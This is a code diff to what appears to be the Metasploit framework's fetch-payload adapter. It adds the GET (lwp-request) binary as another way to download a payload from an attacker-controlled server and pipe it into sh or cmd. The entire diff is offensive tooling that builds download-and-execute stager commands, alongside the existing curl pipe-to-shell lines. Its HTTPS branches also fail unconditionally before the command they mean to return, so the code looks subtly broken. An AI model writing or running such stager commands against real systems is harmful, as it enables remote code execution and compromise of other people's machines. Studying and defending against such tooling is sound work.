@@ -86,7 +86,7 @@ module Msf::Payload::Adapter::Fetch
   def pipe_supported_binaries
     # this is going to expand when we add psh support
     return %w[CURL] if windows?
-    %w[WGET CURL]
+    %w[WGET GET CURL]
   end
 
   def generate(opts = {})
@@ -115,6 +115,8 @@ module Msf::Payload::Adapter::Fetch
     case datastore['FETCH_COMMAND'].upcase
     when 'WGET'
       return _generate_wget_pipe
+    when 'GET'
+      return _generate_get_pipe
     when 'CURL'
       return _generate_curl_pipe
     else
@@ -132,6 +134,8 @@ module Msf::Payload::Adapter::Fetch
       return _generate_tnftp_command
     when 'WGET'
       return _generate_wget_command
+    when 'GET'
+      return _generate_get_command
     when 'CURL'
       return _generate_curl_command
     when 'TFTP'
@@ -331,6 +335,43 @@ module Msf::Payload::Adapter::Fetch
       return "curl -s http://#{_download_pipe}|#{execute_cmd}"
     when 'HTTPS'
       return "curl -sk https://#{_download_pipe}|#{execute_cmd}"
+    else
+      fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
+    end
+  end
+
+  def _generate_get_command
+    # Specifying the method (-m GET) is necessary on OSX
+    case fetch_protocol
+    when 'HTTP'
+      get_file_cmd = "GET -m GET http://#{download_uri}>#{_remote_destination}"
+    when 'HTTPS'
+      # There is no way to disable cert check in GET ...
+      print_error('GET binary does not support insecure mode')
+      fail_with(Msf::Module::Failure::BadConfig, 'FETCH_CHECK_CERT must be true when using GET')
+      get_file_cmd = "GET -m GET https://#{download_uri}>#{_remote_destination}"
+    when 'FTP'
+      get_file_cmd = "GET ftp://#{download_uri}>#{_remote_destination}"
+    else
+      fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
+    end
+    _execute_add(get_file_cmd)
+  end
+
+  def _generate_get_pipe
+    # Specifying the method (-m GET) is necessary on OSX
+    execute_cmd = 'sh'
+    execute_cmd = 'cmd' if windows?
+    case fetch_protocol
+    when 'HTTP'
+      return "GET -m GET http://#{_download_pipe}|#{execute_cmd}"
+    when 'HTTPS'
+      # There is no way to disable cert check in GET ...
+      print_error('GET binary does not support insecure mode')
+      fail_with(Msf::Module::Failure::BadConfig, 'FETCH_CHECK_CERT must be true when using GET')
+      return "GET -m GET https://#{_download_pipe}|#{execute_cmd}"
+    when 'FTP'
+      return "GET ftp://#{_download_pipe}|#{execute_cmd}"
     else
       fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
     end
